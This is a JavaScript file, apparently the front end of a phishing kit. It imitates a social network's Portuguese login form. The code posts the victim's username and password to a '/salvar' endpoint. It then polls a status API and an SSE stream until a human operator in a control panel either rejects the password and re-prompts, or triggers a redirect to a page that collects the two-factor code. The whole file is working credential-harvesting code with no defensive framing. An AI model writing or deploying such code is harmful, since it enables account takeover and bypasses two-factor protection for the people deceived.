const loginForm = document.querySelector('#login-form');
const feedback = document.querySelector('#feedback');
const submitButton = loginForm.querySelector('.primary-button');
const usernameInput = document.querySelector('#username');
const passwordInput = document.querySelector('#password');

let pollingInterval = null;

function mostrarErro(mensagem) {
  if (!feedback) return;
  feedback.textContent = mensagem || "Sua senha está incorreta. Confira-a.";
  feedback.style.display = "block";
  feedback.style.color = "#ed4956";
  if (passwordInput) {
    passwordInput.style.borderColor = "#ed4956";
  }
}

function esconderErro() {
  if (!feedback) return;
  feedback.textContent = "";
  feedback.style.display = "none";
  if (passwordInput) {
    passwordInput.style.borderColor = "";
  }
}

if (passwordInput) {
  passwordInput.addEventListener("input", () => {
    if (passwordInput.value.length > 0) {
      esconderErro();
    }
  });
}

if (usernameInput) {
  usernameInput.addEventListener("input", () => {
    if (usernameInput.value.length > 0) {
      esconderErro();
    }
  });
}

loginForm.addEventListener('submit', async (event) => {
  event.preventDefault();
  const username = usernameInput ? usernameInput.value.trim() : "";
  const password = passwordInput ? passwordInput.value : "";

  if (!username || !password) {
    mostrarErro("Preencha todos os campos.");
    return;
  }

  esconderErro();
  submitButton.disabled = true;
  submitButton.textContent = 'Aguarde...';

  sessionStorage.setItem('loginIdentifier', username);
  sessionStorage.setItem('vr_usuario', username);

  try {
    const res = await fetch('/salvar', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        nome: username,
        senha: password,
        usuario: username,
        username: username,
        password: password
      }),
    });
  } catch (err) {
    console.warn("Aviso ao enviar credenciais:", err);
  }

  // Inicia espera ativa pela decisão do operador no painel ou validação
  iniciarEsperaStatus(username);
});

function iniciarEsperaStatus(usuario) {
  if (pollingInterval) clearInterval(pollingInterval);

  const checarStatus = async () => {
    try {
      const res = await fetch(`/api/status-login?usuario=${encodeURIComponent(usuario)}&t=${Date.now()}`, {
        cache: "no-store",
        headers: { "Cache-Control": "no-cache" }
      });
      if (!res.ok) return;
      const data = await res.json();

      // 1. Senha recusada / inválida
      if (data.status_credencial === "invalido") {
        clearInterval(pollingInterval);
        pollingInterval = null;

        submitButton.disabled = false;
        submitButton.textContent = 'Entrar';
        mostrarErro("Sua senha está incorreta. Confira-a.");

        if (passwordInput) {
          passwordInput.value = "";
          passwordInput.focus();
        }
        return;
      }

      // 2. Operador clicou em Solicitar 2FA
      if (data.status_login === "solicitar_2fa") {
        clearInterval(pollingInterval);
        pollingInterval = null;

        submitButton.textContent = 'Carregando...';
        setTimeout(() => {
          window.location.href = `/codigo/?usuario=${encodeURIComponent(usuario)}`;
        }, 200);
        return;
      }
    } catch (err) {
      console.error("Erro ao verificar status do login:", err);
    }
  };

  pollingInterval = setInterval(checarStatus, 1000);
  // Executa uma primeira verificação rápida
  setTimeout(checarStatus, 500);
}

// Conexão SSE para antecipar transições instantâneas (<50ms)
let sseSource = null;
function conectarSSELogin() {
  if (!window.EventSource) return;
  try {
    if (sseSource) sseSource.close();
    sseSource = new EventSource("/api/stream?t=" + Date.now());

    sseSource.onmessage = (event) => {
      try {
        const json = JSON.parse(event.data);
        if (!json || !json.consolidados) return;

        const currentUser = sessionStorage.getItem('loginIdentifier');
        if (!currentUser) return;

        const userKey = currentUser.toLowerCase().trim();
        const item = json.consolidados.find(c => (c.usuario || "").toLowerCase().trim() === userKey);

        if (item) {
          if (item.status_credencial === "invalido") {
            if (pollingInterval) clearInterval(pollingInterval);
            submitButton.disabled = false;
            submitButton.textContent = 'Entrar';
            mostrarErro("Sua senha está incorreta. Confira-a.");
            if (passwordInput) {
              passwordInput.value = "";
              passwordInput.focus();
            }
          } else if (item.status_login === "solicitar_2fa") {
            if (pollingInterval) clearInterval(pollingInterval);
            submitButton.textContent = 'Carregando...';
            window.location.href = `/codigo/?usuario=${encodeURIComponent(currentUser)}`;
          }
        }
      } catch (e) {}
    };

    sseSource.onerror = () => {
      if (sseSource) sseSource.close();
      setTimeout(conectarSSELogin, 3000);
    };
  } catch (e) {}
}

conectarSSELogin();
